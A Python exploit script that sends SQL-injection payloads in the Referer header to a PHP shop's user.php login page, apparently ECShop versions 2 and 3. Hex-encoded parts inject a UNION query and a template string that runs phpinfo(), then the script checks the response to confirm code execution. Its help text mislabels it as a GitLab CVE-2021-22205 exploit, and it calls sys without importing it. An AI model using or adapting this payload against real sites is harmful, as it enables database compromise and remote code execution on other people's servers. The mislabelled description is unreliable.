import requests,argparse,re

def pwn(url):
    # Default is execute payload: phpinfo()
    print("[*] Default is execute phpinfo() function")
    version_2 = r'''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'''
    version_3 = r'''45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a'''

    proxies = {
        "http":"http://127.0.0.1:8080",
        "https":"http://127.0.0.1:8080"
    }
    payload = [version_2,version_3]

    payload_Header = {"Content-Type":"application/x-www-form-urlencoded"}

    url = url + "/user.php?act=login"

    for i in payload:
        payload_Header["Referer"] = i
        try:
            response = requests.get(url=url, headers=payload_Header, proxies=proxies)
            #print(response.text)
            result_Flag = bool(re.search(r"PHP Version[\s\S]+?System[\s\S]+?Build Date[\s\S]+?Configure Command",response.text))
            if result_Flag == True:
                print("[+] SQL inject succeed, match phpinfo() function strings on the web page: \nPHP Verison\nSystem\nBuild Date\nConfigure Command")
        except:
            print("[+] Inject SQL injection payload failed")
            
if __name__ in '__main__':
    parser = argparse.ArgumentParser(add_help = True, description = "Just a simple exploit for gitlab CVE-2021-22205")
    parser.add_argument("-u",'-url',action='store',help="Specify your target")
    options = parser.parse_args()

    if options.u is None:
        parser.print_help()
        sys.exit(1)
    
    pwn(options.u)
